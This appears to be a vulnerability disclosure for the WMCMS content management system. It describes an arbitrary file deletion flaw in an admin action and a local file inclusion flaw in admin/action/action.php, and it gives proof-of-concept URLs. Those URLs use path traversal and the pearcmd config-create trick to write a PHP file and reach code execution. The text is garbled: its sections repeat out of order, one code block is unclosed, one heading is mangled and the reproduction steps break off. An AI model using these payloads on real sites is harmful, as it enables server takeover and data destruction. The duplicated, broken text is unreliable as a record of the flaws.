### How to implement arbitrary file deletion?
（1）In the admin/action/novel/novel.txt.php file of WMCMS, the following code snippet is used, in this code, first use the judgment that $type is equal to "del", then use the POST() function to receive a parameter value named path, and execute the delete file function DelFile()
![输入图片说明](https://foruda.gitee.com/images/1704768233640309180/00fb2c43\_10725996.png "图片2.png")
（2）However, following up on DelFile(), it was found that DelFile() did not have any security filtering measures.
![输入图片说明](https://foruda.gitee.com/images/1704768471737366653/c55d866d\_10725996.png "图片3.png")
（3）At the same time, the $type and path mentioned in (1) are variables that the user can control, that is, the user can delete any file on the server by constructing a specific path value, because this interface is an interface with admin permission, so the premise of this vulnerability is that you have an account with admin permission and log in.
### Steps to reproduce
（1）First, log in to the background with the admin account to obtain the corresponding cookies
![输入图片说明](https://foruda.gitee.com/images/1704768983889948198/febd87cb\_10725996.png "图片4.png")
（2）I created a new test .txt file on the server for deletion testing
![输入图片说明](https://foruda.gitee.com/images/1704769173262374987/046ea016\_10725996.png "图片5.png")
（3）The following is a usage message

### How to implement RCE?
Then Admin/Axin/Actin. Phip, find the following code
```
if ( file\_exists('action/'.$cPath.'.php') )
{
//是否运行主处理器
$runMainAction = true;
//前置文件是否存在。
if( file\_exists('plugin/'.$cPath.'.action.php') )
{
require 'plugin/'.$cPath.'.action.php';
}
if( $runMainAction == true )
{
require 'action/'.$cPath.'.php';
}
```
After analysis, it was found that $cPath was controllable and without any filtering, and action.php was introduced in admin/index.php
```
if ( C('admin\_cid') != 0 )
{
Competence($a , $c , $type);
}
//加载分页参数处理
require 'page.php';
//开启缓冲区
ob\_start();
//处理器加载
if ( $a === true )
{
require 'action/action.php';
}
```
So far, a file that can only contain the php suffix contains vulnerabilities
Test POC
```
/admin/index.php?c=/../../../../../../../../../../../../../test&a=yes //I put a test.php in the root directory with phpinfo()
```
The file is included to the RCE：Make use of PEARCMD
Introduction to PEARCMD：pecl is a command-line tool used in PHP to manage extensions, while pear is a library that pecl depends on
So we can change the POC
```
/admin/index.php?+config-create+/&c=../../../../../../../../../../../../usr/local/phpstudy/soft/php/php-5.6.40/lib/php/pearcmd&/<?=phpinfo()?>+/hello.php&a=yes

RCE

### How did the problem arise?

Then Admin/Axin/Actin. Phip, find the following code

```

if ( file\_exists('action/'.$cPath.'.php') )

{

//是否运行主处理器

$runMainAction = true;

//前置文件是否存在。

if( file\_exists('plugin/'.$cPath.'.action.php') )

{

require 'plugin/'.$cPath.'.action.php';

}

if( $runMainAction == true )

{

require 'action/'.$cPath.'.php';

}

```

After analysis, it was found that $cPath was controllable and without any filtering, and action.php was introduced in admin/index.php

```

if ( C('admin\_cid') != 0 )

{

Competence($a , $c , $type);

}

//加载分页参数处理

require 'page.php';

//开启缓冲区

ob\_start();

//处理器加载

if ( $a === true )

{

require 'action/action.php';

}

```

So far, a file that can only contain the php suffix contains vulnerabilities

Test POC

```

/admin/index.php?c=/../../../../../../../../../../../../../test&a=yes //I put a test.php in the root directory with phpinfo()

```

The file is included to the RCE：Make use of PEARCMD

Introduction to PEARCMD：pecl is a command-line tool used in PHP to manage extensions, while pear is a library that pecl depends on

So we can change the POC

```

/admin/index.php?+config-create+/&c=../../../../../../../../../../../../usr/local/phpstudy/soft/php/php-5.6.40/lib/php/pearcmd&/<?=phpinfo()?>+/hello.php&a=yes

### How did the problem arise?

（1）In the admin/action/novel/novel.txt.php file of WMCMS, the following code snippet is used, in this code, first use the judgment that $type is equal to "del", then use the POST() function to receive a parameter value named path, and execute the delete file function DelFile()

![输入图片说明](https://foruda.gitee.com/images/1704768233640309180/00fb2c43\_10725996.png "图片2.png")

（2）However, following up on DelFile(), it was found that DelFile() did not have any security filtering measures.

![输入图片说明](https://foruda.gitee.com/images/1704768471737366653/c55d866d\_10725996.png "图片3.png")

（3）At the same time, the $type and path mentioned in (1) are variables that the user can control, that is, the user can delete any file on the server by constructing a specific path value, because this interface is an interface with admin permission, so the premise of this vulnerability is that you have an account with admin permission and log in.

### Steps to reproduce

（1）First, log in to the background with the admin account to obtain the corresponding cookies
